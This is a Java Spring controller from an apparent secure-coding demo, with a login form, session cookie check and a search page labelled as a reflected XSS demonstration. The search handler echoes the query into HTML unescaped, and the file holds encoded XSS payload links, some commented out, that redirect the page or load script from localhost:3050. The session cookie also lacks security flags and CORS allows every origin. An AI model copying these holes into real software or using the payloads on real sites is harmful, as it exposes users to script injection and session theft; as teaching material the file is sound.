package com.securecode.Web;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import com.securecode.Controller.LoginController;
import com.securecode.Controller.SessionManager;
import com.securecode.DomainObject.MemberDomainObject;
import com.securecode.restService.ResponseMessage;

import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletResponse;

@Controller
public class WebController {

	@CrossOrigin(origins = "*")
	@GetMapping(value = "/login", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
	public String login() {

        return 
			"<html>" +
			"<title></title>" +
			"<body>" +
			"  <h2>Login</h2>" +
			"  <form action=\"/login\" method=\"post\">" +
			"      <input name=\"username\" type=\"text\" placeholder=\"login\" value=\"\" />" +
			"      <input name=\"password\" type=\"password\" placeholder=\"password\" value=\"\" />" +
			"      <input type=\"submit\" value=\"login\" />" +
			"  </form>" +
			"</body>" +
			"</html>";
    }


	@CrossOrigin(origins = "*")
	@PostMapping(value = "/login", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
	public String login(HttpServletResponse response, String username, String password) {

		ResponseMessage responseMessage = new ResponseMessage();
		MemberDomainObject member = LoginController.Login(responseMessage, username, password);

		if (member == null) {

			return 
				"<html>" +
				"<title></title>" +
				"<body>" +
				"  <h2>Login</h2>" +
				"  <div>Invalid Credentials</div>" +
				"  <form action=\"/login\" method=\"post\">" +
				"      <input name=\"username\" type=\"text\" placeholder=\"login\" value=\"\" />" +
				"      <input name=\"password\" type=\"password\" placeholder=\"password\" value=\"\" />" +
				"      <input type=\"submit\" value=\"login\" />" +
				"  </form>" +
				"</body>" +
				"</html>";

		}

		String sessionkey = SessionManager.GenerateNewSessionKey();
		SessionManager.SetSession(sessionkey, member.memberid);


		Cookie cookie = new Cookie("Session", sessionkey);
		response.addCookie(cookie);


		String content = String.format("Welcome to the site %s", member.fullname);

        return 
			"<html>" +
			"<title></title>" +
			"<body>" +
			"  <h2>Login</h2>" +
			"  <div>" + content + "</div>" +
			"  <div><a href=\"/verify\">Verify Cookie</a></div>" +
			"</body>" +
			"</html>";
    }


	@CrossOrigin(origins = "*")
	@GetMapping(value = "/verify", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
	public String verify(HttpServletResponse response, @CookieValue(value="Session") String sessionid) {


	  try{

		if (sessionid == null) {
			response.setStatus(401);
			return "Unauthorized";
		}

		int userid = SessionManager.verifycookie(sessionid);

	
		String content = String.format("Session Id = %s, UserId = %d", sessionid, userid); 

        return 
			"<html>" +
			"<title></title>" +
			"<body>" +
			"  <h2>Login<h2>" +
			"  <div>" + content + "</div>" +
			"</body>" +
			"</html>";
    
	  }
	  catch (Exception ex) {
		return "error";
	  }
	}

	@CrossOrigin(origins = "*")
	@GetMapping(value = "/search", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
	public String search(HttpServletResponse response, @CookieValue(value="Session") String sessionid, @RequestParam String query) {

	  try{

		if (sessionid == null) {
			response.setStatus(401);
			return "Unauthorized";
		}

		int userid = SessionManager.verifycookie(sessionid);

	
		String content = String.format("showing search results for: %s ", query); 

        return 
			"<html>" +
			"<title></title>" +
			"<body>" +
			"  <h2>Search <h2>" +
			"  <div>" + content + "</div>" +
			"  <div> This page is a reflected XSS demonstration page.  Any value from the query parameter will be reflected to the page  See the following link for an example</div>" +
			"  <div><a href='/search?query=Hello%20Friend'>Friendly Link</a></div>" +
			"  <div><a href='/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E'>Malicious Link</a></div>" +
//			"  <div><a href='/search?query=%3Cimg%20src%3D%22x%22%20onerror%3D%22window.location%3D%60http%3A%2F%2Fwww.google.com%60%22%3E'>Malicious Link 2</a></div>" +
//			"  <div><a href='/search?query=%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Flocalhost%3A3050%2Fscripts%2Fscript.js%22%3E%3C%2Fscript%3E%20'>Malicious Link 3</a></div>" +
//			"  <div><a href='/search?query=%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Flocalhost%3A3050%2Fscripts%2Fscript1.js%22%3E%3C%2Fscript%3E%20'>Malicious Link 4</a></div>" +
//			"  <div><a href='/search?query=%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Flocalhost%3A3050%2Fscripts%2Fscript2.js%22%3E%3C%2Fscript%3E%20'>Malicious Link 5</a></div>" +

			"</body>" +
			"</html>";
    
	  }
	  catch (Exception ex) {
		return "error";
	  }
	}


/*
    public ResponseEntity<Response> login() {
		ResponseMessage responseMessage = new ResponseMessage();
		List<MemberResponse> members = MemberController.getAllMembers(responseMessage);
		
		Response response = new Response(responseMessage, members);
		if (response.getSuccess())
			return ResponseEntity.status(HttpStatus.OK).body(response);
		else
			return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
	}

	@CrossOrigin(origins = "*")
	@GetMapping("/api/member/{id}")
	public ResponseEntity<Response> getMember(@PathVariable int id) {
		ResponseMessage responseMessage = new ResponseMessage();
		MemberResponse member = MemberController.getMemberById(responseMessage, id);

		Response response = new Response(responseMessage, member);
		if (response.getSuccess())
			return ResponseEntity.status(HttpStatus.OK).body(response);
		else
			return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
	}

	@CrossOrigin(origins = "*")
	@PostMapping("/api/member")
	public ResponseEntity<Response> registerMember(@RequestBody RegisterMemberRequest request) {
		ResponseMessage responseMessage = new ResponseMessage();
		MemberResponse member = MemberController.registerMember(responseMessage, request);
		
		Response response = new Response(responseMessage, member);
		if (response.getSuccess())
			return ResponseEntity.status(HttpStatus.OK).body(response);
		else
			return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
	}
*/
}